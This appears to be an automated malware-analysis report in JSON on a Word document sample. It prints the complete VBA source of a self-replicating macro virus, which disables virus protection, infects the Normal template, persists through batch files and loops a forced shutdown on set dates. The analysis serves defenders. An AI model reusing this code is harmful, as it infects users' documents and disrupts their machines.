{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Chr": "May attempt to obfuscate specific str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Environ": "May read system environment variables",
            "FileCopy": "May copy a file",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "Shell": "May run an executable file or a system command",
            "System": "May run an executable file or a system command on a Mac",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "vbHide": "May run an executable file or a system command",
            "vbMinimizedNoFocus": "May run an executable file or a system command"
        },
        "macro": "Private Sub Document_Open()\nApplication.EnableCancelKey = wdCancelDisabled\nOn Error Resume Next\nOptions.VirusProtection = False\nApplication.CommandBars(\"Tools\").Controls(12).Visible = False\nShellDoc = Environ(\"WINDIR\") & \"\\ShellNew\\\" & System.PrivateProfileString(\"\", \"HKEY_CLASSES_ROOT\\.doc\\Word.Document.8\\ShellNew\", \"Filename\")\n\nSet NT = NormalTemplate.VBProject.VBComponents(1).CodeModule\nSet AD = ActiveDocument.VBProject.VBComponents(1).CodeModule\nSet TD = ThisDocument.VBProject.VBComponents(1).CodeModule\nVCode = TD.Lines(1, TD.CountOfLines)\n\nIf Normal.ThisDocument.ReadOnly = 0 Then\n    NT.DeleteLines 1, NT.CountOfLines: NT.InsertLines 1, VCode\n    NormalTemplate.Save\nElse\n    SetAttr (NormalTemplate.FullName), vbArchive\nEnd If\n\nIf ActiveDocument.ReadOnly = 0 Then\n    AD.DeleteLines 1, AD.CountOfLines: AD.InsertLines 1, VCode\n    ActiveDocument.Save\nEnd If\n\n'>-- Check if we are Master Document\nIf UCase(ActiveDocument.FullName) = UCase(ShellDoc) Then\n    ActiveDocument.Save\n    NormalTemplate.Saved = True\n    Application.Quit\nEnd If\n\n'>-- Infect Master Document\nIf ND.CountOfLines > 25 Then\n    If GetAttr(ShellDoc) <> 0 Then\n        SetAttr (ShellDoc), 0\n        Shell Application.Path & \"\\Winword.exe \" & ShellDoc, vbMinimizedNoFocus\n    End If\nEnd If\n'AV Stealth in: HKEY_CLASSES_ROOT\\.doc\\Word.Document.8\\ShellNew Filename\nRandomize Timer\nchkSt = System.PrivateProfileString(\"\", \"HKEY_CLASSES_ROOT\\.doc\\Word.Document.8\\ShellNew\", \"Filename\")\nSTL = \"Ver_\" & Int(Rnd * 9999) & \".dat\"\nIf UCase(chkSt) <> Right(ShellDoc, Len(ShellDoc) - 12) Then Name ShellDoc As Environ(\"WinDir\") & \"\\ShellNew\\\" & STL\nSystem.PrivateProfileString(\"\", \"HKEY_CLASSES_ROOT\\.doc\\Word.Document.8\\ShellNew\", \"Filename\") = STL\n\n'Reinkanation:\nchkSt = System.PrivateProfileString(\"\", \"HKEY_CLASSES_ROOT\\.doc\\Word.Document.8\\ShellNew\", \"Filename\")\nFileCopy NormalTemplate.FullName, Environ(\"WinDir\") & \"\\Java\\X.cls\" 'Kopiere NormalTemplate\nFileCopy Environ(\"WINDIR\") & \"\\ShellNew\\\" & chkSt, Environ(\"WinDir\") & \"\\Java\\Y.cls\"    'Kopiere Winword8.doc\nx = Int(Rnd * 55) + 200: y = Int(Rnd * 19) + 238: z = Int(Rnd * 30) + 21    'Zufallszahlen\n\nOpen \"Tarnkappe.bat\" For Output As #1\n    Print #1, \"ren \" & Environ(\"WinDir\") & \"\\Java\\X.cls \" & Chr(219) & Chr(x) & Chr(y) & Chr(z) & \"Sub.cls\"\n    Print #1, \"ren \" & Environ(\"WinDir\") & \"\\Java\\Y.cls \" & Chr(219) & Chr(y) & Chr(z) & Chr(x) & \"Sub.cls\"\n    Print #1, \"del Tarnkappe.bat\"\nOpen Environ(\"WinDir\") & \"\\Winstart.bat\" For Output As #2\n    Print #2, \"@echo off\"\n    Print #2, \"copy \" & Environ(\"WinDir\") & \"\\Java\\\" & Chr(219) & Chr(x) & Chr(y) & Chr(z) & \"Sub.cls \" & NormalTemplate.FullName\n    Print #2, \"copy \" & Environ(\"WinDir\") & \"\\Java\\\" & Chr(219) & Chr(y) & Chr(z) & Chr(x) & \"Sub.cls \" & Environ(\"WinDir\") & \"\\ShellNew\\\" & chkSt\nClose\nShell \"Tarnkappe.bat\", vbHide\n\nEclipse:\nIf Day(Now) <> Month(Now) Then Exit Sub\nDo\nShell Environ(\"WinDir\") & \"\\Rundll32.exe Kernel32,SetSystemPowerState\", vbHide  'The lord says power off\nLoop\nEnd Sub\n"
    },
    "filename": "VirusShare_228c91b5dbff3d01659c0fff0afb92cc",
    "filesize": 30720,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 5.0, Code page: 1252, Author: Empty, Template: Normal.dot, Last Saved By: Empty, Revision Number: 1, Name of Creating Application: Microsoft Word 9.0, Create Time/Date: Wed Oct 11 18:35:00 2000, Last Saved Time/Date: Wed Oct 11 18:35:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "228c91b5dbff3d01659c0fff0afb92cc",
        "sha1": "11707bae13b5fff8ac9defb3c91d01271d49d2b8",
        "sha256": "164e03519bb492462a2734d45473aadedf774d6a7c5e620162f24f7bb34bc58c"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj",
            "pC-3",
            ". A!n",
            "\\Jf\\Jf",
            "Empty",
            "Normal.dot",
            "Empty",
            "Microsoft Word 9.0",
            "Titolo",
            "pC-3",
            "@{%3",
            "9pon",
            "s(17deM0odul",
            "ADe@",
            "A@IveF",
            "VCod",
            "TD.Line@&",
            "CountOf",
            "7If ",
            ".ReadOnl",
            "A0 Then",
            "NT.De",
            "lete",
            "Insert",
            "QSav",
            "[FulB",
            "), vbArc",
            "End If",
            "i\": ",
            "- Check @if we ` 4Ma`Trq",
            "UC}(\t",
            "'l&a",
            "Aq(sQuiy'(\"",
            "ILnf",
            "ND< 0> 25",
            "0Geta7(g",
            "<> iGA",
            ", 0CC",
            "Path~",
            "Winwvexe",
            "!BMiniA@edNoFs",
            "'AV S",
            "teal ",
            "in:R _ntH ",
            "R`ae Ti",
            "chkSt6\u07d1K\u07d1h",
            "\"Ver_a Int(RO",
            ".dat 1#H\"",
            ") @1 Right3, fLg5- ",
            ": C%",
            " As inDirTL@",
            "'Reinkanl:",
            "Cp```",
            " Copy",
            "SVLu;",
            "+Java\\",
            "X.co 'Ko piere<",
            "_o^oB",
            "#55) + 200: ",
            "38: z)",
            "1Q;'Z",
            "ufallszaLhlbAenPar`",
            "ppe.b@)",
            " FOutpu2tA%#1S:{nt #d\"rA",
            "?Chr(2i\t& ",
            "del T",
            "start",
            "s #2",
            "@echo off?",
            "/z\"z\t/",
            "dHid clipse@EQ",
            "TDaywSM",
            "\u0450 Exit %",
            "Rundll",
            "32.kKern",
            ",pbPow0erStPFvb",
            "  '0",
            " ln says p1",
            "Loop",
            "(!;D",
            "Tools",
            "WINDIR$",
            "\\ShellNew\\",
            "HKEY_CLASSES_ROOT\\.doc\\Word.Document.8\\ShellNew",
            "Filename ",
            ">-- Check if we are Master Document",
            ">-- Infect Master Document ",
            "\\Winword.exe ",
            "AV Stealth in: HKEY_CLASSES_ROOT\\.doc\\Word.Document.8\\ShellNew Filename",
            "HKEY_CLASSES_ROOT\\.doc\\Word.Document.8\\ShellNew",
            "Filename ",
            "Ver_ ",
            ".dat",
            "WinDir$",
            "\\ShellNew\\",
            "HKEY_CLASSES_ROOT\\.doc\\Word.Document.8\\ShellNew",
            "Filename ",
            "Reinkanation:",
            "HKEY_CLASSES_ROOT\\.doc\\Word.Document.8\\ShellNew",
            "Filename ",
            "WinDir$",
            "\\Java\\X.cls",
            "Kopiere NormalTemplate",
            "WINDIR$",
            "\\ShellNew\\",
            "WinDir$",
            "\\Java\\Y.cls",
            "Kopiere Winword8.doc ",
            "Zufallszahlen",
            "Tarnkappe.bat",
            "ren ",
            "WinDir$",
            "\\Java\\X.cls ",
            "Sub.cls",
            "ren ",
            "WinDir$",
            "\\Java\\Y.cls ",
            "Sub.cls",
            "del Tarnkappe.bat",
            "WinDir$",
            "\\Winstart.bat",
            "@echo off",
            "copy ",
            "WinDir$",
            "\\Java\\",
            "Sub.cls ",
            "copy ",
            "WinDir$",
            "\\Java\\",
            "Sub.cls ",
            "WinDir$",
            "\\ShellNew\\",
            "Tarnkappe.bat",
            "WinDir$",
            "\\Rundll32.exe Kernel32,SetSystemPowerState",
            "The lord says power off",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VGlobal!",
            "Spac",
            "Crea",
            "tabl",
            "Pre decla",
            "BExp",
            "Temp",
            "lateDeri",
            "$CustomlizC1P",
            "Sub _Op",
            "en()appl",
            "ication.",
            "CancelKey",
            "n Error ",
            "Res Nex",
            " s.Vi",
            "rusProte",
            "3Com",
            "mandBars",
            "(\"Tools\").Contr",
            "(12)",
            "#si`Shell]",
            "nviron(\"",
            "WINDIR\")  & \"\\",
            "Syst",
            "em.=#fil",
            "eS@ng(\"\"",
            ", \"HKEY_",
            "CLASSES_",
            "ROOT\\.doc\\Word.EH.8",
            "Set ",
            "NT@#f.VB",
            "5%!;",
            "(!;D",
            "..enE#Li?I",
            "Wordk",
            "Win16~",
            "Win32",
            "VBA6#",
            "Progetto1DL",
            "stdole`",
            "Project-",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Documentj",
            "Document_Open",
            "Application*",
            "EnableCancelKey",
            "wdCancelDisabled{",
            "Options",
            "VirusProtectionoD",
            "CommandBars",
            "ControlsK",
            "Visible",
            "ShellDoc\\X",
            "Environ",
            "Systema",
            "PrivateProfileString[",
            "NTo^",
            "NormalTemplateq",
            "VBProjectOh",
            "VBComponents",
            "CodeModule",
            "AD~\\",
            "ActiveDocument\\",
            "TD=_",
            "VCode",
            "Lines",
            "CountOfLines!\\",
            "ReadOnly4<",
            "DeleteLines",
            "InsertLines",
            "Save",
            "SetAttrC",
            "FullName\u041e",
            "vbArchive",
            "UCase5",
            "Savedd",
            "Quit9",
            "ND_^",
            "GetAttr",
            "ShellV",
            "Path2",
            "vbMinimizedNoFocus",
            "TimerX",
            "chkSt",
            "RndR",
            "Right",
            "FileCopy@",
            "ChrK~",
            "vbHideW",
            "EclipseYu",
            "Now%",
            "Month",
            "Project",
            "(!;D",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#D:",
            "\\WINNT\\S",
            "ystem32\\",
            "c2.tlb#O",
            "LE Automation",
            "D@NormalDNABr",
            "5%!;",
            "A!OfficfOA`f",
            "w!G{2DF",
            "8D04C-5B",
            "FA-101B-BDE5fAAd",
            "2fJ:\\M",
            "icrosoft",
            "mso9 .dll#",
            " 9 .0 Ob",
            " Library<",
            "ThisDo",
            "cumentG",
            "\"DAc",
            ",!Ct\"B",
            "ThisDocument",
            "ID=\"{0FEB3E19-5ADF-4643-BD34-2B3BDECC1489}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "VersionCompatible32=\"393222000\"",
            "CMG=\"E7E5F0BF7041B745B745B745B745\"",
            "DPB=\"2A283D7C817D817D81\"",
            "GC=\"6D6F7AC5FE09FF09FFF6\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=66, 66, 510, 404, Z",
            "Documento di Microsoft Word",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.341799",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
